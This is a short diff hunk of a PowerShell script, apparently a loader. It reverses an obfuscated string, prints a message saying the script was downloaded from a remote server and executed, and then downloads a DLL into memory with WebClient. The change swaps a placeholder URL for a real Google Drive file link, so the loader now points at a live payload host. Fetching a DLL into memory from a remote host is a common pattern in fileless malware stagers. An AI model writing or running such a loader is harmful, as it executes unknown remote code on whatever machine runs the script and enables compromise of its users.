@@ -14,7 +14,7 @@ $t4 = ([regex]::Matches($t3, '.', 'RightToLeft') | ForEach-Object { $_.Value }) 
 Write-Host "This has been downloaded off a remote server and executed."
 
 # Download the DLL into memory
-$url = "https://drive.google.com/uc?export=download&id=PUT_REAL_ID_HERE"
+$url = "https://drive.google.com/file/d/1zdt7K5ytNxMtdl5uUzgGW3Gj4oNxYHX5/view?usp=drive_link"
 $webClient = New-Object System.Net.WebClient
 $dllBytes = $webClient.DownloadData($url)
 
